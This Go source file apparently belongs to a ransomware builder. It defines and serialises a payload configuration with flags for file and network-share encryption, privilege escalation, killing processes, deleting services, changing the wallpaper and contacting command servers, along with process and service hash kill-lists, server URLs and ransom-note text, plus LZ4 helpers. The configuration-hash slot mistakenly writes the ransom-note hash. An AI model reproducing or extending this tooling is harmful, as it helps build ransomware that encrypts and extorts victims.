package main

import (
	"bytes"
	"encoding/binary"
	"io"

	"github.com/pierrec/lz4/v4"
)

func compress(input []byte) ([]byte, error) {
	var buff bytes.Buffer
	writer := lz4.NewWriter(&buff)
	_, err := writer.Write(input)

	if err != nil {
		return nil, err
	}
	writer.Close()
	return buff.Bytes(), nil
}

func decompress(input []byte) ([]byte, error) {
	var out []byte
	buffer := make([]byte, 64)
	reader := lz4.NewReader(bytes.NewReader(input))

	for {
		numBytes, err := reader.Read(buffer)

		if err != nil && err != io.EOF {
			return nil, err
		}
		out = append(out, buffer[:numBytes]...)

		if err == io.EOF {
			break
		}
	}
	return out, nil
}

type Configuration struct {
	version                 []int
	largeFileEncryptFlag    bool
	privilegeEscalationFlag bool
	networkEncryptFlag      bool
	terminateProcessFlag    bool
	deleteServiceFlag       bool
	wallpaperFlag           bool
	mutexFlag               bool
	serverCommunicationFlag bool
	processHashList         []uint64
	serviceHashList         []uint64
	remoteServerURLList     [][]byte
	ransomNoteContent       []byte
	ransomNoteContentHash   uint64
	configurationHash       uint64
	mutexString             []byte
}

func createConfiguration() (*Configuration, error) {
	config := Configuration{}
	return &config, nil
}

func (config *Configuration) setVersion(version []int) {
	config.version = version
}

func (config *Configuration) setFlags(flags []bool) {
	config.largeFileEncryptFlag = flags[0]
	config.privilegeEscalationFlag = flags[1]
	config.networkEncryptFlag = flags[2]
	config.terminateProcessFlag = flags[3]
	config.deleteServiceFlag = flags[4]
	config.wallpaperFlag = flags[5]
	config.mutexFlag = flags[6]
	config.serverCommunicationFlag = flags[7]
}

func (config *Configuration) setProcessHashList(processHashList []uint64) {
	config.processHashList = processHashList
}

func (config *Configuration) appendProcessHashList(hash uint64) {
	config.processHashList = append(config.processHashList, hash)
}

func (config *Configuration) removeProcessHashList(hash uint64) {
	for index, eachHash := range config.processHashList {
		if eachHash == hash {
			config.processHashList = append(config.processHashList[:index], config.processHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setServiceHashList(serviceHashList []uint64) {
	config.serviceHashList = serviceHashList
}

func (config *Configuration) appendServiceHashList(hash uint64) {
	config.serviceHashList = append(config.serviceHashList, hash)
}

func (config *Configuration) removeServiceHashList(hash uint64) {
	for index, eachHash := range config.serviceHashList {
		if eachHash == hash {
			config.serviceHashList = append(config.serviceHashList[:index], config.serviceHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setRemoteServerURLList(remoteServerURLList [][]byte) {
	config.remoteServerURLList = remoteServerURLList
}

func (config *Configuration) addRemoteServerURLList(remoteServerURL []byte) {
	config.remoteServerURLList = append(config.remoteServerURLList, remoteServerURL)
}

func (config *Configuration) setRansomNoteContent(ransomNoteContent []byte) {
	config.ransomNoteContent = ransomNoteContent
}

func (config *Configuration) setRansomNoteContentHash(ransomNoteContentHash uint64) {
	config.ransomNoteContentHash = ransomNoteContentHash
}

func (config *Configuration) setConfigurationHash(configurationHash uint64) {
	config.configurationHash = configurationHash
}

func (config *Configuration) setMutexString(mutexString []byte) {
	config.mutexString = mutexString
}

// note:implement for when fields are empty
func (config *Configuration) toBytes() []byte {
	var result []byte

	separator := []byte("@cPeterr")

	// add version

	for _, val := range config.version {
		result = append(result, byte(val))
	}
	result = append(result, separator...)

	// add flags
	flags := []bool{config.largeFileEncryptFlag, config.privilegeEscalationFlag, config.networkEncryptFlag,
		config.terminateProcessFlag, config.deleteServiceFlag, config.wallpaperFlag, config.mutexFlag, config.serverCommunicationFlag}

	for _, flag := range flags {
		if flag {
			result = append(result, byte(1))
		} else {
			result = append(result, byte(0))
		}
	}

	result = append(result, separator...)

	// add process hash list
	hashBuffer := make([]byte, 8)

	for _, eachHash := range config.processHashList {
		binary.LittleEndian.PutUint64(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}

	result = append(result, separator...)

	// add service hash list

	for _, eachHash := range config.serviceHashList {
		binary.LittleEndian.PutUint64(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}

	result = append(result, separator...)

	// add remote server url list

	for _, urlBuffer := range config.remoteServerURLList {
		result = append(result, urlBuffer...)
		result = append(result, []byte("yeet")...)
	}

	result = append(result, separator...)

	// add ransomNoteContent
	result = append(result, config.ransomNoteContent...)

	result = append(result, separator...)

	// add ransomNoteContentHash
	binary.LittleEndian.PutUint64(hashBuffer, config.ransomNoteContentHash)
	result = append(result, hashBuffer...)
	result = append(result, separator...)

	// add configurationHash
	binary.LittleEndian.PutUint64(hashBuffer, config.ransomNoteContentHash)
	result = append(result, hashBuffer...)
	result = append(result, separator...)

	// add mutexstring
	result = append(result, config.mutexString...)
	return result
}
